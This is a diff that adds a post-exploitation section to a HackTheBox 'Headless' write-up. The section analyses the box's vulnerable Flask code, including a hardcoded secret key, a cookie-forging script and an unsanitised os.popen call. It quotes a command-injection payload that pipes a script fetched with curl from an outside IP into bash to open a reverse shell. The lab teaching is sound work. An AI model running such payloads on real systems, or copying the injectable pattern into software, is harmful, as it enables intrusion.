@@ -3,7 +3,7 @@ layout: article
 title: "Headless - HackTheBox Writeup"
 date: "2024-05-08"
 image: "/assets/img/headless/homepage.png"
-tags: ["website", "xss", "cookies"]
+tags: ["linux", "website", "xss", "cookies"]
 ---
 
 Headless is a box in HackTheBox that features XSS vulnerabilities to steal admin cookies and privilege escalation using an unsafe sh script.
@@ -335,6 +335,118 @@ sudo syscheck
 </div>
 
 We get the shell and the root flag.
+
+<h4>Post explotation</h4>
+
+It's always important to not only know how to exploit applications, but to also understand why and where they are vulnerable to provide better security.
+
+If we list the home directory of the vulnerable machine we find the `app.py` file that's responsible for launching the vulnerable website on port 5000.
+
+Let's inspect the vulnerable sections of this code from top to bottom. I added some comments to make it more clear.
+
+<div class="article-code">
+{% highlight python %}
+from flask import Flask, render_template, request, make_response, abort, send_file
+from itsdangerous import URLSafeSerializer
+import os
+import random
+
+app = Flask(__name__, template_folder=".")
+
+
+# Set a bytes object to the secret key attribute of the app instance
+app.secret_key = b'PcBE2u6tBomJmDMwUbRzO18I07A'
+# Serialize the data with the secret key
+serializer = URLSafeSerializer(app.secret_key)
+
+
+@app.route('/')
+def index():
+    # Get the Remote_Addr header from the request
+    client_ip = request.remote_addr
+    # Check if the request comes from localhost, if it's grant them admin cookie.
+    # Otherwise give them user cookie.
+    is_admin = True if client_ip in ['127.0.0.1', '::1'] else False
+    token = "admin" if is_admin else "user"
+    # Serialize "admin" or "user" with the secret key.
+    serialized_value = serializer.dumps(token)
+    
+    # Make the reponse and assign a value to the 'is_admin' cookie.
+    response = make_response(render_template('index.html', is_admin=token))
+    response.set_cookie('is_admin', serialized_value, httponly=False)
+
+    return response
+{% endhighlight %}
+</div>
+
+From this block we can see where the cookies are coming from and how they are being generated. We can add some code to print both the user and admin cookies.
+
+<div class="article-code">
+{% highlight python %}
+# Set a bytes object to the secret key attribute of the app instance
+app.secret_key = b'PcBE2u6tBomJmDMwUbRzO18I07A'
+# Serialize the data with a secret key
+serializer = URLSafeSerializer(app.secret_key)
+
+serialized_value = serializer.dumps("user")
+print("Serialized User Cookie:", serialized_value)
+
+serialized_value = serializer.dumps("admin")
+print("Serialized Admin Cookie:", serialized_value)
+{% endhighlight %}
+</div>
+
+<div class="article-code">
+{% highlight sh %}
+jeanp@~$ python app.py
+Serialized User Cookie: InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Serialized Admin Cookie: ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+{% endhighlight %}
+</div>
+
+Let's now inspect the /dashboard route code.
+
+<div class="article-code">
+{% highlight python %}
+@app.route('/dashboard', methods=['GET', 'POST'])
+def admin():
+    # If the cookie in the request is the user cookie abort with Unauthorized 401
+    if serializer.loads(request.cookies.get('is_admin')) == "user":
+        return abort(401)
+
+    # Variable where the output of the command will be stored.
+    script_output = ""
+
+    if request.method == 'POST':
+        # Get the date from the user's input
+        date = request.form.get('date')
+        if date:
+            # VULNERABLE CODE
+            script_output = os.popen(f'bash report.sh {date}').read()
+
+    return render_template('dashboard.html', script_output=script_output)
+{% endhighlight %}
+</div>
+
+`os.popen(f'bash report.sh {date}').read()`. It's not a good idea to pass input to a shell without sanitizing it first. It makes sense now why passing `date=2023-09-15;curl http://10.10.14.142:8000/script.sh | bash` in the payload works to get a reverse shell going. This payload translates to `bash report.sh 2023-09-15;curl http://10.10.14.142:8000/script.sh | bash`.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
